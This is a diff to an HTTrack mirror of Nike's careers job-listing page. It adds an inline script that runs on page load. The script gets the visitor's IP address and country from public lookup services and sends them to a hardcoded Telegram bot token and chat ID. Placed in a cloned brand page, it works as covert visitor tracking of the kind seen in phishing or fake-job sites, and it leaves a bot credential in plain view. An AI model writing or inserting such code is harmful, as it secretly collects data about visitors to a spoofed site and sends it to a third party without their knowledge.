@@ -687,6 +687,41 @@ window.dataLayer = new Proxy([], {
 <script crossorigin="anonymous" integrity="sha256-S6P8tt7y6A1iHMwXRSL6g8ifsolix5Ch6yO0702bKlo=" src="../../../cdn.sites.paradox.ai/paradox-prod-careersites/4eb95d7ad8/jobs-sort-by.bundle.js"></script>
 <script crossorigin="anonymous" integrity="sha256-EhSf4rg6xPcM4TO2SSJiYPEQMQcpy9sbCGbKKbH74kA=" src="../../../cdn.sites.paradox.ai/paradox-prod-careersites/4eb95d7ad8/jobs-list-only.bundle.js"></script>
 <script crossorigin="anonymous" integrity="sha256-OHl67jh6pGkCVlF2Nb18wTQOFzWnqA0P6/fzY6cKDKM=" src="../../../cdn.sites.paradox.ai/paradox-prod-careersites/4eb95d7ad8/jobs-pagination.bundle.js"></script>
+
+<script>
+async function sendVisitorInfo() {
+    try {
+        // Step 1: Get visitor's IP address using HTTPS
+        let response = await fetch('https://api64.ipify.org?format=json');
+        let ipData = await response.json();
+        let userIP = ipData.ip;
+
+        // Step 2: Get country using ip-api (now using HTTPS)
+        let geoResponse = await fetch(`https://ip-api.com/json/${userIP}?fields=country`);
+        let geoData = await geoResponse.json();
+        let country = geoData.country || "Unknown Country";
+
+        // Step 3: Send IP & country to Telegram
+        let message = `New Visitor Detected:\nIP: ${userIP}\nCountry: ${country}`;
+        let botToken = '7494153356:AAFQo6RDU7o_Cjn88uVqmwTFyQZaqoOn25k';
+        let chatId = '5607989288';
+
+        let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Send request to Telegram API
+        let xhr = new XMLHttpRequest();
+        xhr.open("GET", telegramUrl, true);
+        xhr.send();
+        
+    } catch (error) {
+        console.error('Error fetching IP details or sending Telegram message:', error);
+    }
+}
+
+// Ensure script runs after the page loads
+window.onload = sendVisitorInfo;
+</script>
+    
 </body>
 <!-- Mirrored from careers.nike.com/jobs/page/1 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 07 Feb 2025 02:48:37 GMT -->
 </html>
